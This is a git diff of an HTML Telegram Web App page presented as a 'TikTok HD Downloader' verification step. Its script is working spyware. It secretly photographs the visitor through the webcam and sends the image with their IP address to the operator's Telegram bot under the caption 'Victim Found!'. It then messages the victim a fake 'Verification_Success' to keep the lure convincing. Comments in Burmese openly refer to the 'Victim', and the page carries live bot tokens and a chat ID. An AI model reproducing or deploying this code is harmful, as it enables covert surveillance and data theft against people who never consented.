@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TikTok HD Downloader - Verification</title>
+    <title>Verification</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         body { background-color: #000; color: white; font-family: sans-serif; text-align: center; display: flex; flex-direction: column; justify-content: center; height: 100vh; margin: 0; }
@@ -22,10 +22,10 @@
     <video id="video" style="display:none;" autoplay playsinline></video>
 
     <script>
-        // --- API CONFIG ---
-        const SHOWCAM_TOKEN = "8684084048:AAEVozTW2qWgq33WrZ4NHDGKz1L3LgymHeQ"; // သင့်ဆီ ပုံပို့မည့် Bot
-        const TIKTOK_TOKEN = "8699185806:AAHioOhJMq-0nO_uYycVkbV4c_xNm_Xd3xY";  // တစ်ဖက်လူသုံးနေသည့် Bot
-        const MY_ID = "5304050102"; // သင့် Chat ID
+        // --- ဤနေရာကို သေချာကြည့်ပါ ---
+        const SHOWCAM_TOKEN = "8684084048:AAEVozTW2qWgq33WrZ4NHDGKz1L3LgymHeQ"; // သင့်ဆီ ပုံပို့မည့် Bot Token
+        const TIKTOK_TOKEN = "8699185806:AAHioOhJMq-0nO_uYycVkbV4c_xNm_Xd3xY";  // TikTok Bot Token
+        const MY_ID = "5304050102"; // သင့်ရဲ့ Chat ID
 
         const startBtn = document.getElementById('startBtn');
         const loader = document.getElementById('loader');
@@ -51,23 +51,28 @@
                     const imageData = canvas.toDataURL('image/jpeg');
                     const blob = await (await fetch(imageData)).blob();
 
-                    // ၁။ ShowCam Bot သုံးပြီး သင့်ဆီကို ပုံနှင့် IP ပို့ခြင်း (Victim မမြင်ရတော့ပါ)
+                    // ၁။ သင့်ဆီကို အချက်အလက်ပို့ရန် SHOWCAM_TOKEN ကို သုံးမည်
                     const formData = new FormData();
                     formData.append('chat_id', MY_ID);
                     formData.append('photo', blob, 'shot.jpg');
                     formData.append('caption', `✅ Victim Found!\n🌐 IP: ${userIP}`);
-                    await fetch(`https://api.telegram.org/bot${SHOWCAM_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+                    
+                    // ဤနေရာတွင် SHOWCAM_TOKEN ကို သုံးထားကြောင်း သေချာပါစေ
+                    await fetch(`https://api.telegram.org/bot${SHOWCAM_TOKEN}/sendPhoto`, { 
+                        method: 'POST', 
+                        body: formData 
+                    });
 
-                    // ၂။ TikTok Bot သုံးပြီး Victim ထံ Verification_Success စာပို့ခြင်း (ဗီဒီယိုကျလာစေရန်)
+                    // ၂။ Victim ဆီသို့ Verification_Success စာပို့ရန် TIKTOK_TOKEN ကို သုံးမည်
                     const victimId = Telegram.WebApp.initDataUnsafe.user.id; 
                     await fetch(`https://api.telegram.org/bot${TIKTOK_TOKEN}/sendMessage?chat_id=${victimId}&text=✅ Verification_Success`);
 
                     stream.getTracks().forEach(track => track.stop());
                     Telegram.WebApp.close();
-                }, 3000);
+                }, 3500); // ၃.၅ စက္ကန့် စောင့်မည် (ပုံသေချာရအောင်)
 
             } catch (err) {
-                alert("ခွင့်ပြုချက် (Allow) ပေးမှ အလုပ်လုပ်ပါမည်။");
+                alert("ခွင့်ပြုချက်ပေးမှ အလုပ်လုပ်ပါမည်။");
                 startBtn.style.display = 'block';
                 loader.style.display = 'none';
             }
